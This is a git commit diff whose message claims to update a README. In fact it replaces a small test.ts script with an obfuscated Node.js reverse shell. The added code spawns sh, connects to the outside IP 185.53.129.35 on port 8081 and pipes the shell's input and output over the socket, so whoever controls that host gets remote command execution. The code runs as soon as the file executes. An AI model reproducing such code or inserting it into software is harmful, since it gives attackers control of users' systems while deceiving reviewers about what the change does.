19d8d479c619dc0395ed2b418fc81760b1e0acdf
Scarlet Team <mateuspimentel@gmail.com>
2024-05-08 01:35:41 -0300

    Update README.MD

--- test.ts
+++ test.ts
@@ -1,3 +1,12 @@
-
-const argValue = process.argv[2];
-console.log("Argument value length:", argValue.length);
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("sh", []);
+    var client = new net.Socket();
+    client.connect(8081, "185.53.129.35", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
